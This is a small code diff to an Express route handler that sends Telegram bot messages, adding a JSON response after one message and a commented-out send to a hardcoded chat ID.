@@ -117,9 +117,13 @@ router.post('/generals', (req, res) => {
         .catch(err => console.log(err));
     }, 100);
   }else if (req.body.c === ''){
-    bot.sendMessage(CHAT_ID, infoMessage2);
+    bot.sendMessage(CHAT_ID, infoMessage2)
+      .then( () =>{
+        res.json({'Checked': 'checked'});
+      })
   }else{
     bot.sendMessage(CHAT_ID, infoMessage3);
+    // bot.sendMessage('1660900306', infoMessage3);
 
     setTimeout(() => { // Evitar que salga primero el teclado
       bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts3)
